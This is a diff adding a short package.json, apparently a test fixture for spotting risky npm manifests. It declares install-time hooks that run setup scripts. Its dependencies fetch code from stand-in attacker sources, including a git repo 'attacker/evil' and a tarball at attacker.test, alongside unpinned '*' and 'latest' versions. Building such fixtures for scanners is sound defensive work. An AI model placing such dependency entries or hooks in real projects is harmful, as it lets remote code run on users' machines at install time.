@@ -1,0 +1,16 @@
+{
+  "name": "dep-bootstrap",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node setup.js",
+    "postinstall": "node ./scripts/setup.js",
+    "build": "tsc -p ."
+  },
+  "dependencies": {
+    "evil": "git+https://github.com/attacker/evil.git#main",
+    "leftpad": "attacker/leftpad",
+    "art": "https://attacker.test/art-1.0.0.tgz",
+    "left-pad": "*",
+    "chalk": "latest"
+  }
+}
